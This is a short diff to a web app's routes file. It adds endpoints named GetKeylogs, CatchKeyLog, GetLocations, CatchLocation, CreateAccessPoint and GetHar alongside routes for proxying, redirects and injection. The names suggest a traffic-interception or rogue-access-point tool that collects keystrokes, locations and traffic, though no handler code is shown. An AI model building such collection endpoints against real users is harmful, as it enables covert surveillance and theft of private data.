@@ -9,12 +9,18 @@ GET     /                                       App.Index
 # Ignore favicon requests
 GET     /favicon.ico                            404
 
-
+GET     /GetKeylogs             	App.GetKeylogs
+GET     /CatchKeyLog             	App.CatchKeyLog
+GET     /GetLocations             	App.GetLocations
+GET     /CatchLocation             	App.CatchLocation
 GET     /StartSimpleProxy             	App.StartSimpleProxy
 GET     /TriggerRedirects             	App.TriggerRedirects
 GET     /TriggerBlocks	         		App.TriggerBlocks
 GET     /TriggerWolfPack	         	App.TriggerWolfPack
 GET     /TriggerInjection	         	App.TriggerInjection
+GET     /CreateAccessPoint	         	App.CreateAccessPoint
+GET     /GetHar	         				App.GetHar
+
 
 
 
